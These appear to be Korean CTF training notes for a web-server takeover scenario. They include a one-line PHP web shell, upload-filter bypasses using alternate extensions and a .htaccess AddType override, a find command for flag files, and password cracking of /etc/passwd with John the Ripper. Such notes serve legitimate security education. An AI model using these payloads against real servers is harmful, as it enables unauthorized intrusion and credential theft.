# CTF

25-4 CTF 개념 정리 - 시나리오

## 시나리오 1번

모 서버 장악 후, 내부에 저장된 정보 확인.

**힌트**
```
1. 업로드 경로 확인
 - 임의의 파일 업로드 해보기

2. 웹 쉘 업로드 후 소스코드
   <?php system($_GET['cmd']); ?>

   Day2 파일 업로드 취약점 실습 내용
       - 1) 확장자를 우회) php -> phar, phtml 등등
       - 2) .htaccess(아파치 서버 설정 파일) 업로드 후 확장자 저장 설정 변경
             Addtype application/x-httpd-php .abc .txt .xyz 등
       - vi .htaccess (.으로 시작되는 파일은 기본적으로 숨김처리 되어있음.
         view - show hidden files 체크 혹은 ls -al

3. 웹 쉘 업로드 성공 후 시스템 명령어로 flag 확인 (cat flag.php X, flag가 들어간 파일)
  - find / -name "flag*"

4.  /etc/passwd 파일
  - john the reaper (패스워드 크랙 툴)로 패스워드 알아내보기 : 크랙 하고자하는 문자열을 vi로 텍스트 파일

```

**kali linux 프록시 설정 끄는 법**

1. Web Browser
2. 우측 상단 햄버거 기호 클릭
3. Preferences
4. Proxy 검색
5. settings No Proxy로 바꾼 후 접속

### 1) 업로드가 가능한 경로


